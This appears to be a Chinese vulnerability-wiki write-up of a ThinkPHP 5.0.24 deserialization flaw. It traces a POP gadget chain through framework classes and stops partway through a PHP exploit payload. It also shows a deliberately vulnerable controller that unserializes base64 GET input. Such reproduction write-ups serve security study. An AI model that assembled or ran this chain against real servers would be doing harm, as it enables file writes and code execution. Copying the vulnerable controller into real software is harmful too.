<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Thinkphp 5.0.24 反序列化（任意文件写入）漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Thinkphp 5.0.24 \u53cd\u5e8f\u5217\u5316\uff08\u4efb\u610f\u6587\u4ef6\u5199\u5165\uff09\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_5" },
          ]},
        ];

    </script>
    <script src="../../../../js/base.js"></script>
      <script src="../../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Thinkphp%205.1.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Thinkphp%205.1.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0/" class="btn btn-xs btn-link">
        Thinkphp 5.1.1 反序列化pop链构造
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Thinkphp%206.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%20_%206.0.2%20session%20id%E6%9C%AA%E4%BD%9C%E8%BF%87%E6%BB%A4%E5%AF%BC%E8%87%B4getshell/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Thinkphp%206.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%20_%206.0.2%20session%20id%E6%9C%AA%E4%BD%9C%E8%BF%87%E6%BB%A4%E5%AF%BC%E8%87%B4getshell/" class="btn btn-xs btn-link">
        Thinkphp \&lt; 6.0.2 session id未作过滤导致getshell
      </a>
    </div>
    
  </div>

    

    <h1 id="thinkphp-5024">Thinkphp 5.0.24 反序列化（任意文件写入）漏洞<a class="headerlink" href="#thinkphp-5024" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>该漏洞只能在linux服务器上使用，win无法适用。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Thinkphp 5.0.24</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p>这个漏洞是框架的反序列化漏洞，只有二次开发实现了反序列化才可以利用，所以先构造漏洞代码，在/application/index/controller/Index.php中添加如下代码</p>
<div class="codehilite"><pre><span></span><code><span class="k">class</span> <span class="n">Index</span>
{
    <span class="n">public</span> <span class="n">function</span> <span class="nb">index</span>()
    {
        <span class="n">echo</span> <span class="s">&quot;Welcome thinkphp 5.0.24&quot;</span>;
        <span class="n">unserialize</span>(<span class="n">base64_decode</span>(<span class="nv">$_GET</span>[<span class="s">&#39;a&#39;</span>]));
    }
}
</code></pre></div>

<p>Thinkphp
5.0.x反序列化最后触发RCE，要调用的<code>Request</code>类<code>__call</code>方法，所以直接找可用的<code>__call</code>方法</p>
<p>这里选择了Output类(/thinkphp/library/think/console/Output.php)，因为其中的block可以当作跳板</p>
<div class="codehilite"><pre><span></span><code><span class="nt">public</span><span class="w"> </span><span class="nt">function</span><span class="w"> </span><span class="nt">__call</span><span class="o">($</span><span class="nt">method</span><span class="o">,</span><span class="w"> </span><span class="o">$</span><span class="nt">args</span><span class="o">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="err">if</span><span class="w"> </span><span class="err">(in_array($method,</span><span class="w"> </span><span class="err">$this-&gt;styles))</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="err">array_unshift($args,</span><span class="w"> </span><span class="err">$method)</span><span class="p">;</span>
<span class="w">        </span><span class="err">return</span><span class="w"> </span><span class="err">call_user_func_array(</span><span class="cp">[</span><span class="nv">$this</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;block&#39;</span><span class="cp">]</span><span class="err">,</span><span class="w"> </span><span class="err">$args)</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nt">if</span><span class="w"> </span><span class="o">($</span><span class="nt">this-</span><span class="o">&gt;</span><span class="nt">handle</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nt">method_exists</span><span class="o">($</span><span class="nt">this-</span><span class="o">&gt;</span><span class="nt">handle</span><span class="o">,</span><span class="w"> </span><span class="o">$</span><span class="nt">method</span><span class="o">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="err">return</span><span class="w"> </span><span class="err">call_user_func_array(</span><span class="cp">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nx nx-Member">handle</span><span class="p">,</span><span class="w"> </span><span class="nv">$method</span><span class="cp">]</span><span class="err">,</span><span class="w"> </span><span class="err">$args)</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="nt">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="err">throw</span><span class="w"> </span><span class="err">new</span><span class="w"> </span><span class="err">Exception(&#39;method</span><span class="w"> </span><span class="err">not</span><span class="w"> </span><span class="n">exists</span><span class="p">:</span><span class="s1">&#39; . __CLASS__ . &#39;</span><span class="o">-&gt;</span><span class="err">&#39;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="err">$</span><span class="n">method</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="err">}</span>
</code></pre></div>

<p>从头开始分析，首先全局搜索<code>__destruct</code>，选择Windows类(/thinkphp/library/think/process/pipes/Windows.php)，代码如下</p>
<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">__destruct</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">    </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">close</span><span class="p">();</span>
<span class="w">    </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">removeFiles</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div>

<p>跟进removeFiles</p>
<div class="codehilite"><pre><span></span><code><span class="n">private</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">removeFiles</span><span class="p">()</span>
<span class="err">{</span>
<span class="w">    </span><span class="n">foreach</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">files</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="err">$</span><span class="n">filename</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">file_exists</span><span class="p">(</span><span class="err">$</span><span class="n">filename</span><span class="p">))</span><span class="w"> </span><span class="err">{</span>
<span class="w">            </span><span class="nv">@unlink</span><span class="p">(</span><span class="err">$</span><span class="n">filename</span><span class="p">);</span>
<span class="w">        </span><span class="err">}</span>
<span class="w">    </span><span class="err">}</span>
<span class="w">    </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">files</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">[]</span><span class="p">;</span>
<span class="err">}</span>
</code></pre></div>

<p>file_exists可以触发<code>__tostring</code>，所以寻找<code>__tostring</code>，找到了Model类(/thinkphp/library/think/Model.php)</p>
<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">__toString</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">    </span><span class="kr">return</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">toJson</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div>

<p>跟进toJson</p>
<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">toJson</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON_UNESCAPED_UNICODE</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="kr">return</span><span class="w"> </span><span class="n">json_encode</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">toArray</span><span class="p">(),</span><span class="w"> </span><span class="err">$</span><span class="n">options</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>跟进toArray</p>
<div class="codehilite"><pre><span></span><code><span class="nt">public</span><span class="w"> </span><span class="nt">function</span><span class="w"> </span><span class="nt">toArray</span><span class="o">()</span>
<span class="p">{</span>
<span class="w">    </span><span class="err">$item</span><span class="w">    </span><span class="err">=</span><span class="w"> </span><span class="cp">[]</span><span class="p">;</span>
<span class="w">    </span><span class="err">$visible</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="cp">[]</span><span class="p">;</span>
<span class="w">    </span><span class="err">$hidden</span><span class="w">  </span><span class="err">=</span><span class="w"> </span><span class="cp">[]</span><span class="p">;</span>

<span class="w">    </span><span class="err">$data</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">array_merge($this-&gt;data,</span><span class="w"> </span><span class="err">$this-&gt;relation)</span><span class="p">;</span>

<span class="w">    </span><span class="err">...</span>
<span class="w">    </span><span class="err">//</span><span class="w"> </span><span class="err">追加属性（必须定义获取器）</span>
<span class="w">    </span><span class="err">if</span><span class="w"> </span><span class="err">(!empty($this-&gt;append))</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="err">foreach</span><span class="w"> </span><span class="err">($this-&gt;append</span><span class="w"> </span><span class="err">as</span><span class="w"> </span><span class="err">$key</span><span class="w"> </span><span class="err">=&gt;</span><span class="w"> </span><span class="err">$name)</span><span class="w"> </span><span class="err">{</span>
<span class="w">            </span><span class="err">if</span><span class="w"> </span><span class="err">(is_array($name))</span><span class="w"> </span><span class="err">{</span>
<span class="w">                </span><span class="err">...</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="nt">elseif</span><span class="w"> </span><span class="o">(</span><span class="nt">strpos</span><span class="o">($</span><span class="nt">name</span><span class="o">,</span><span class="w"> </span><span class="s1">&#39;.&#39;</span><span class="o">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="err">...</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="nt">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="err">$relation</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="n">Loader</span><span class="p">:</span><span class="o">:</span><span class="nf">parseName</span><span class="p">(</span><span class="err">$</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">false</span><span class="p">);</span>
<span class="w">                </span><span class="err">if</span><span class="w"> </span><span class="err">(method_exists($this,</span><span class="w"> </span><span class="err">$relation))</span><span class="w"> </span><span class="err">{</span>
<span class="w">                    </span><span class="err">$modelRelation</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">$this-&gt;$relation()</span><span class="p">;</span>
<span class="w">                    </span><span class="err">$value</span><span class="w">         </span><span class="err">=</span><span class="w"> </span><span class="err">$this-&gt;getRelationData($modelRelation)</span><span class="p">;</span>

<span class="w">                    </span><span class="err">if</span><span class="w"> </span><span class="err">(method_exists($modelRelation,</span><span class="w"> </span><span class="err">&#39;getBindAttr&#39;))</span><span class="w"> </span><span class="err">{</span>
<span class="w">                        </span><span class="err">$bindAttr</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">$modelRelation-&gt;getBindAttr()</span><span class="p">;</span>
<span class="w">                        </span><span class="err">if</span><span class="w"> </span><span class="err">($bindAttr)</span><span class="w"> </span><span class="err">{</span>
<span class="w">                            </span><span class="err">foreach</span><span class="w"> </span><span class="err">($bindAttr</span><span class="w"> </span><span class="err">as</span><span class="w"> </span><span class="err">$key</span><span class="w"> </span><span class="err">=&gt;</span><span class="w"> </span><span class="err">$attr)</span><span class="w"> </span><span class="err">{</span>
<span class="w">                                </span><span class="err">$key</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">is_numeric($key)</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="err">$</span><span class="n">attr</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="err">$</span><span class="n">key</span><span class="p">;</span>
<span class="w">                                </span><span class="err">if</span><span class="w"> </span><span class="err">(isset($this-&gt;data</span><span class="cp">[</span><span class="nv">$key</span><span class="cp">]</span><span class="err">))</span><span class="w"> </span><span class="err">{</span>
<span class="w">                                    </span><span class="err">throw</span><span class="w"> </span><span class="err">new</span><span class="w"> </span><span class="err">Exception(&#39;bind</span><span class="w"> </span><span class="err">attr</span><span class="w"> </span><span class="err">has</span><span class="w"> </span><span class="n">exists</span><span class="p">:</span><span class="err">&#39;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="err">$</span><span class="n">key</span><span class="p">);</span>
<span class="w">                                </span><span class="p">}</span><span class="w"> </span><span class="nt">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                                    </span><span class="err">$item</span><span class="cp">[</span><span class="nv">$key</span><span class="cp">]</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">$value</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="err">$value-&gt;getAttr($attr)</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="err">null</span><span class="p">;</span>
<span class="w">                                </span><span class="p">}</span>
<span class="w">                            </span><span class="err">}</span>
<span class="w">                            </span><span class="nt">continue</span><span class="o">;</span>
<span class="w">                        </span><span class="err">}</span>
<span class="w">                    </span><span class="err">}</span>
<span class="w">                    </span><span class="o">$</span><span class="nt">item</span><span class="cp">[</span><span class="nv">$name</span><span class="cp">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="nt">value</span><span class="o">;</span>
<span class="w">                </span><span class="err">}</span><span class="w"> </span><span class="nt">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="err">$item</span><span class="cp">[</span><span class="nv">$name</span><span class="cp">]</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">$this-&gt;getAttr($name)</span><span class="p">;</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="err">}</span>
<span class="w">        </span><span class="err">}</span>
<span class="w">    </span><span class="err">}</span>
<span class="w">    </span><span class="nt">return</span><span class="w"> </span><span class="o">!</span><span class="nt">empty</span><span class="o">($</span><span class="nt">item</span><span class="o">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="o">$</span><span class="nt">item</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="cp">[]</span><span class="o">;</span>
<span class="err">}</span>
</code></pre></div>

<p>由于我们的目的是执行<code>__call</code>，所以要找函数调用的点，在toArray里有三处</p>
<p><img alt="" src="../resource/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId25.png" /></p>
<p>然后看这三处哪里可控，经调试第三处可控，需要满足的条件是</p>
<div class="codehilite"><pre><span></span><code><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">empty</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">append</span><span class="p">))</span>
<span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">method_exists</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">relation</span><span class="p">))</span>
<span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">method_exists</span><span class="p">(</span><span class="err">$</span><span class="n">modelRelation</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;getBindAttr&#39;</span><span class="p">))</span>
<span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">bindAttr</span><span class="p">)</span>
</code></pre></div>

<p>且不满足</p>
<div class="codehilite"><pre><span></span><code><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">is_array</span><span class="p">(</span><span class="err">$</span><span class="n">name</span><span class="p">))</span>
<span class="n">elseif</span><span class="w"> </span><span class="p">(</span><span class="n">strpos</span><span class="p">(</span><span class="err">$</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;.&#39;</span><span class="p">))</span>
<span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="err">$</span><span class="n">key</span><span class="p">]))</span>
</code></pre></div>

<p>才能够进入到第三处，首先需要满足$relation是Model内的方法，然后经过如下赋值</p>
<div class="codehilite"><pre><span></span><code><span class="err">$</span><span class="n">modelRelation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="err">$</span><span class="n">relation</span><span class="p">();</span>
<span class="err">$</span><span class="n">value</span><span class="w">         </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">getRelationData</span><span class="p">(</span><span class="err">$</span><span class="n">modelRelation</span><span class="p">);</span>
</code></pre></div>

<p>需要满足$modelRelation可控，经过查找，可以将$modelRelation设为getError</p>
<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">getError</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">    </span><span class="kr">return</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="nf">error</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>然后跟进getRelationDate</p>
<div class="codehilite"><pre><span></span><code><span class="k">protected</span><span class="w"> </span><span class="nx">function</span><span class="w"> </span><span class="nx">getRelationData</span><span class="p">(</span><span class="nx">Relation</span><span class="w"> </span><span class="err">$</span><span class="nx">modelRelation</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">parent</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">!</span><span class="err">$</span><span class="nx">modelRelation</span><span class="o">-&gt;</span><span class="nx">isSelfRelation</span><span class="p">()</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">get_class</span><span class="p">(</span><span class="err">$</span><span class="nx">modelRelation</span><span class="o">-&gt;</span><span class="nx">getModel</span><span class="p">())</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">get_class</span><span class="p">(</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">parent</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="err">$</span><span class="nx">value</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">parent</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// 首先获取关联数据</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">method_exists</span><span class="p">(</span><span class="err">$</span><span class="nx">modelRelation</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">getRelation</span><span class="err">&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="err">$</span><span class="nx">value</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="nx">modelRelation</span><span class="o">-&gt;</span><span class="nx">getRelation</span><span class="p">();</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">throw</span><span class="w"> </span><span class="nx">new</span><span class="w"> </span><span class="nx">BadMethodCallException</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">method</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="nx">exists</span><span class="p">:</span><span class="err">&#39;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="nx">get_class</span><span class="p">(</span><span class="err">$</span><span class="nx">modelRelation</span><span class="p">)</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="err">&#39;</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">getRelation</span><span class="err">&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="err">$</span><span class="nx">value</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>这里需要$modelRelation为Relation类型。全局查找getRelation方法且为Relation类型的类，找到了HasOne(/thinkphp/library/think/model/relation/HasOne.php)</p>
<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">getRelation</span><span class="p">(</span><span class="err">$</span><span class="n">subRelation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">closure</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">null</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="c1">// 执行关联定义方法</span>
<span class="w">    </span><span class="err">$</span><span class="n">localKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">localKey</span><span class="p">;</span>
<span class="w">    </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">closure</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">call_user_func_array</span><span class="p">(</span><span class="err">$</span><span class="n">closure</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">query</span><span class="p">]);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="c1">// 判断关联类型执行查询</span>
<span class="w">    </span><span class="err">$</span><span class="n">relationModel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">query</span>
<span class="w">        </span><span class="o">-&gt;</span><span class="n">removeWhereField</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">foreignKey</span><span class="p">)</span>
<span class="w">        </span><span class="o">-&gt;</span><span class="n">where</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">foreignKey</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parent</span><span class="o">-&gt;</span><span class="err">$</span><span class="n">localKey</span><span class="p">)</span>
<span class="w">        </span><span class="o">-&gt;</span><span class="n">relation</span><span class="p">(</span><span class="err">$</span><span class="n">subRelation</span><span class="p">)</span>
<span class="w">        </span><span class="o">-&gt;</span><span class="n">find</span><span class="p">();</span>

<span class="w">    </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">relationModel</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="err">$</span><span class="n">relationModel</span><span class="o">-&gt;</span><span class="n">setParent</span><span class="p">(</span><span class="n">clone</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parent</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kr">return</span><span class="w"> </span><span class="err">$</span><span class="n">relationModel</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>可以看到这些条件都是满足的，然后看getBindAttr，发现在OneToOne类中是可控的</p>
<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">getBindAttr</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">    </span><span class="kr">return</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">bindAttr</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>所以代码执行到</p>
<div class="codehilite"><pre><span></span><code><span class="err">$</span><span class="n">item</span><span class="p">[</span><span class="err">$</span><span class="n">key</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">value</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="err">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">getAttr</span><span class="p">(</span><span class="err">$</span><span class="n">attr</span><span class="p">)</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">null</span><span class="p">;</span>
</code></pre></div>

<p>就可以调用Output类的<code>__call</code>方法，调用payload如下</p>
<div class="codehilite"><pre><span></span><code><span class="n">namespace</span><span class="w"> </span><span class="n">think</span><span class="p">{</span>
<span class="w">    </span><span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">console</span>\<span class="n">Output</span><span class="p">;</span>
<span class="w">    </span><span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">model</span>\<span class="n">relation</span>\<span class="n">HasOne</span><span class="p">;</span>
<span class="w">    </span><span class="n">abstract</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="n">Model</span><span class="p">{</span>
<span class="w">        </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">relation</span><span class="p">;</span>
<span class="w">        </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">append</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;1&quot;</span><span class="p">];</span>
<span class="w">        </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">error</span><span class="p">;</span>
<span class="w">        </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">parent</span><span class="p">;</span>
<span class="w">        </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">()</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Output</span><span class="p">();</span>
<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">relation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;getError&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;getError&quot;</span><span class="p">];</span>
<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">append</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;getError&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;getError&quot;</span><span class="p">];</span>
<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">error</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">HasOne</span><span class="p">();</span>
